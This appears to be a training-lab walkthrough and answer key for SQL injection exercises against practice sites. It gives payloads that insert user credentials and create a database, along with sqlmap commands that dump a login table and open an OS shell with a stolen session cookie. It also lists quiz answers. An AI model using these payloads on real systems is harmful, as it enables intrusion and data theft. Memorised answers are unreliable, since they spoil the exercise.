# Tasks

## Perform SQL Injection Attacks

### SQL Injection Attack On MSSQL Database

Use an SQL injection query to perform SQL injection attacks on the website www.goodshopping.com. Create a new user in the database with the credentials Martin/qwerty123. Enter the SQL injection query to create the above user in the MSSQL database. (Note: After clicking on the submit button, reload the page and open the same session to check if the answer is correct or not.)

```
blah';insert into login values('Martin', 'qwerty123');--
```

Create a new database in the MSSQL database with the name MySQLDatabase by using an SQL injection query. Enter the SQL injection query to create the above database. (Note: After clicking on the submit button, reload the page and open the same session to check if the answer is correct or not.)

```
blah';create database MySQLDatabase; ---
```



### Extract MSSQL Databses using sqlmap

Use the sqlmap tool to perform an SQL injection attack on the website www.moviescope.com to extract databases from the MSSQL database. Attempt to retrieve the table content of the column User\_Login. Enter the password for the username steve.

password



#### Retrieve the website cookie

{% hint style="info" %}
Right click on the webpage\
\
In the Developer Tools click on Console\
\
Type: document.cookie\
\
Copy the cookie value
{% endhint %}

#### Get the Databases

```
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<Cookie Value>" --dbs

Y

Y

Y
```

#### Get Database Tables

```
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<Cookie Value>" -D moviescope --tables
```

#### Dump Table data

```
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<Cookie Value>" -D moviescope -T User_Login --dump
```

#### Get OS Shell

```
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<Cookie Value>" --os-shell

Y

hostname

Y
```



## Detect SQL Injection Vulnerabilities

### Detect SQL Injection Vulnerabilities using DSSS

Use the DSSS tool to detect SQL injection vulnerabilities in a web application (www.moviescope.com). Which type of SQL injection attacks is the website www.moviescope.com vulnerable to?

Blind SQL Injection

```
python3 dsss.py
```

```
python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<Cookie Value>" 
```

{% hint style="info" %}
Copy the vulnerable URL and open in the browser
{% endhint %}



### Detect SQL Injection Vulnerability using OWASP ZAP

Use OWASP ZAP to test a web application (www.moviescope.com) for SQL injection vulnerabilities. Enter the CWE ID of the SQL injection vulnerability found in [www.moviescope.com](http://www.moviescope.com).

89



Use OWASP ZAP to test a web application (www.moviescope.com) for SQL injection vulnerabilities. Enter the WASC ID of the SQL injection vulnerability found in [www.moviescope.com](http://www.moviescope.com).

19

